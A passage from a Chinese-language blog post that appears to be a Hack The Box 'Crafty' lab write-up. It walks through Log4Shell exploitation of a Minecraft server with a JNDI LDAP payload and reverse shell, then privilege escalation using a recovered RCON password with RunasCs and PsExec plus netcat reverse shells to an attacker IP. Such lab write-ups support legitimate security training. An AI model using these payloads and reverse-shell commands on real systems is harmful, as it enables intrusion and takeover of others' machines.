+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">connect</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="o">[</span><span class="n">10</span><span class="p">.</span><span class="na">10</span><span class="p">.</span><span class="na">14</span><span class="p">.</span><span class="na">25</span><span class="o">]</span><span class="w"> </span><span class="nf">from</span><span class="w"> </span><span class="p">(</span><span class="n">UNKNOWN</span><span class="p">)</span><span class="w"> </span><span class="o">[</span><span class="n">10</span><span class="p">.</span><span class="na">10</span><span class="p">.</span><span class="na">11</span><span class="p">.</span><span class="na">249</span><span class="o">]</span><span class="w"> </span><span class="n">49682</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="err">`</span><span class="w">
+</span></span></span></code></pre></div><p>验证漏洞是存在的，那么现在找一个exploit直接利用即可</p>
+
+<h4 class="relative group">log4shell exploit 
+    <div id="log4shell-exploit" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#log4shell-exploit" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p><a
+  href="https://github.com/kozmer/log4j-shell-poc"
+    target="_blank"
+  >log4j poc</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone https://github.com/kozmer/log4j-shell-poc.git
+</span></span><span class="line"><span class="cl">python -m venv .
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> bin
+</span></span><span class="line"><span class="cl"><span class="nb">source</span> activate 
+</span></span><span class="line"><span class="cl">pip install -r  ../requirements.txt
+</span></span></code></pre></div><p>需要安装一下java8，通过<a
+  href="https://bugmenot.com/view/oracle.com"
+    target="_blank"
+  >bugmenot</a>网站直接拿一个现成的#Oracle账号</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tar -zxf  jdk-8u202-linux-x64.tar.gz
+</span></span></code></pre></div><p>这个poc会创建一个web服务器和ldap服务器，并且通过命令行参数指定反弹shell的端口，这个脚本默认是执行的<code>/bin/bash</code>，把它改成<code>powershell.exe</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo rlwrap -cAr nc -lvnp <span class="m">9001</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">python3 poc.py --userip 10.10.14.25 --webport <span class="m">8000</span> --lport <span class="m">9001</span>
+</span></span><span class="line"><span class="cl"><span class="si">${</span><span class="nv">jndi</span><span class="p">:</span><span class="nv">ldap</span><span class="p">://10.10.14.25:</span><span class="nv">1389</span><span class="p">/a</span><span class="si">}</span>
+</span></span></code></pre></div><p>登录到Minecraft服务器，发送一下payload: <code>${jndi:ldap://10.10.14.25:1389/a}</code>即可得到反弹shell</p>
+
+<h3 class="relative group">Privilege Escalation 
+    <div id="privilege-escalation" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#privilege-escalation" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>将.jar文件搬运到kali中，并反编译分析一下jar文件的内容。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">python</span> <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">doc</span><span class="p">/</span><span class="nb">python3-impacket</span><span class="p">/</span><span class="n">examples</span><span class="p">/</span><span class="n">smbserver</span><span class="p">.</span><span class="py">py</span> <span class="n">share</span> <span class="p">.</span> <span class="n">-smb2support</span> <span class="n">-username</span> <span class="n">qolt</span> <span class="n">-password</span> <span class="n">pass</span><span class="nv">@word</span><span class="p">!</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">net</span> <span class="n">use</span> <span class="p">\\</span><span class="mf">10.10</span><span class="p">.</span><span class="py">14</span><span class="p">.</span><span class="mf">25</span><span class="p">\</span><span class="n">share</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">qolt</span> <span class="n">pass</span><span class="nv">@word</span><span class="p">!</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">users</span><span class="p">\</span><span class="n">svc_minecraft</span><span class="p">\</span><span class="n">server</span><span class="p">\</span><span class="n">plugins</span><span class="p">&gt;</span> <span class="nb">copy-item</span> <span class="p">.\</span><span class="n">playercounter</span><span class="p">-</span><span class="mf">1.0</span><span class="n">-SNAPSHOT</span><span class="p">.</span><span class="py">jar</span> <span class="p">\\</span><span class="mf">10.10</span><span class="p">.</span><span class="py">14</span><span class="p">.</span><span class="mf">25</span><span class="p">\</span><span class="n">share</span> 
+</span></span></code></pre></div>
+<h4 class="relative group">jd-gui进行java反编译 
+    <div id="jd-gui进行java反编译" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#jd-gui%e8%bf%9b%e8%a1%8cjava%e5%8f%8d%e7%bc%96%e8%af%91" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p><a
+  href="https://github.com/java-decompiler/jd-gui/releases/download/v1.6.6/jd-gui-1.6.6.deb"
+    target="_blank"
+  >jd-gui</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget https://github.com/java-decompiler/jd-gui/releases/download/v1.6.6/jd-gui-1.6.6.deb
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Playercounter</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">JavaPlugin</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">onEnable</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Rcon</span><span class="w"> </span><span class="n">rcon</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">rcon</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Rcon</span><span class="p">(</span><span class="s">&#34;127.0.0.1&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">27015</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;s67u84zKq8IXw&#34;</span><span class="p">.</span><span class="na">getBytes</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">RuntimeException</span><span class="p">(</span><span class="n">e</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">AuthenticationException</span><span class="w"> </span><span class="n">e2</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">RuntimeException</span><span class="p">(</span><span class="n">e2</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> 
+</span></span></span></code></pre></div>
+<h5 class="relative group">runascs进行显式登录 
+    <div id="runascs进行显式登录" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#runascs%e8%bf%9b%e8%a1%8c%e6%98%be%e5%bc%8f%e7%99%bb%e5%bd%95" aria-label="Anchor">#</a>
+    </span>        
+    
+</h5>
+
+<h6 class="relative group">尝试本地开启winrm 
+    <div id="尝试本地开启winrm" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e5%b0%9d%e8%af%95%e6%9c%ac%e5%9c%b0%e5%bc%80%e5%90%afwinrm" aria-label="Anchor">#</a>
+    </span>        
+    
+</h6>
+<p>首先尝试当前的用户能不能开启winrm</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">enable-psremoting</span> <span class="n">-force</span>
+</span></span><span class="line"><span class="cl"><span class="nb">set-wsmanquickconfig</span> <span class="n">-force</span>
+</span></span></code></pre></div><p>都是没有权限执行，那就尝试直接显式登录到administrator</p>
+<p>通过<code>s67u84zKq8IXw</code>尝试登录administrator时，没有输入密码的机会，如果是gui界面可以解决，但是cli界面的话可以通过runascs来解决这个UAC的问题</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">unzip RunasCs.zip
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">iwr http://10.10.14.25/RunasCs.exe -outfile runascs.exe
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">rlwrap -cAr nc -lvnp <span class="m">443</span>
+</span></span><span class="line"><span class="cl">.<span class="se">\r</span>unascs.exe administrator <span class="s1">&#39;s67u84zKq8IXw&#39;</span> powershell -r 10.10.14.25:443 -t <span class="m">0</span>
+</span></span></code></pre></div><p>-t 0: 背景运行，从而即使运行出错也不会阻塞当前shell</p>
+
+<h5 class="relative group">提权到system32 
+    <div id="提权到system32" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e6%8f%90%e6%9d%83%e5%88%b0system32" aria-label="Anchor">#</a>
+    </span>        
+    
+</h5>
+<p>使用microsoft的psexec程序，提权到system
+<a
+  href="https://download.sysinternals.com/files/PSTools.zip"
+    target="_blank"
+  >PsTools</a>
+<a
+  href="https://github.com/int0x33/nc.exe/raw/refs/heads/master/nc64.exe"
+    target="_blank"
+  >nc64.exe</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">iwr </span><span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="mf">10.10</span><span class="p">.</span><span class="py">14</span><span class="p">.</span><span class="mf">25</span><span class="p">/</span><span class="n">PsExec64</span><span class="p">.</span><span class="py">exe</span> <span class="n">-outfile</span> <span class="n">PsExec64</span><span class="p">.</span><span class="py">exe</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">iwr </span><span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="mf">10.10</span><span class="p">.</span><span class="py">14</span><span class="p">.</span><span class="mf">25</span><span class="p">/</span><span class="n">nc64</span><span class="p">.</span><span class="py">exe</span> <span class="n">-outfile</span> <span class="n">nc64</span><span class="p">.</span><span class="py">exe</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">.\</span><span class="n">PsEXEC64</span><span class="p">.</span><span class="py">exe</span> <span class="n">-accepteula</span> <span class="n">-i</span> <span class="n">-s</span> <span class="n">cmd</span><span class="p">.</span><span class="py">exe</span> <span class="p">/</span><span class="n">c</span> <span class="s2">&#34;C:\programdata\apps\nc64.exe 10.10.14.25 443 -e powershell.exe&#34;</span>
+</span></span></code></pre></div><p><code>psexec</code>，<code>-i</code>参数指定交互式运行，<code>-s</code>指定以系统权限执行，通过psexec调用cmd.exe，在通过cmd.exe调用nc，再通过nc调用powershell从而得到反弹shell</p>
+
+          
+          
+          
+        </div>
+
+        
+
+        
+
+        
+
+        
+
+      </div>
+
+      
+      
+        
+        
+          
+          
+        
+        
+        
+        <script
+          type="text/javascript"
+          src="/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js"
+          integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA=="
+          data-oid="views_posts\HTB-Crafty\index.md"
+          data-oid-likes="likes_posts\HTB-Crafty\index.md"></script>
+      
+
+    </section>
+    <footer class="pt-8 max-w-prose print:hidden">
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600">
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="flex group mr-3" href="/posts/htb-driver/">
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span class="flex flex-col">
+                <span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >HTB Driver</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2025-07-18T19:25:26&#43;08:00">18 July 2025</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+            <a class="flex text-right group ml-3" href="/posts/htb-acute/">
+              <span class="flex flex-col">
+                <span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >HTB Acute</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2025-07-23T10:01:38&#43;08:00">23 July 2025</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+        <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
+  <a
+    href="#the-top"
+    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top"
+    title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+
+      </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+  
+  <div class="flex items-center justify-between">
+    
+    
+      <p class="text-sm text-neutral-500 dark:text-neutral-400">
+          &copy;
+          2025
+          
+      </p>
+    
+
+    
+    
+      <p class="text-xs text-neutral-500 dark:text-neutral-400">
+        
+        
+        Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+          href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+          href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
+      </p>
+    
+
+  </div>
+  <script>
+    
+    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+      margin: 24,
+      background: 'rgba(0,0,0,0.5)',
+      scrollOffset: 0,
+    })
+    
+  </script> 
+  
+  <script
+    type="text/javascript"
+    src="/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js"
+    integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh&#43;sCQ0E53ghYrxgYqw&#43;0GCRyIEpA=="></script>
+  
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500"
+  data-url="https://ink410.github.io/">
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800">
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0">
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)">
+        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+    </div>
+  </body>
+  
+</html>
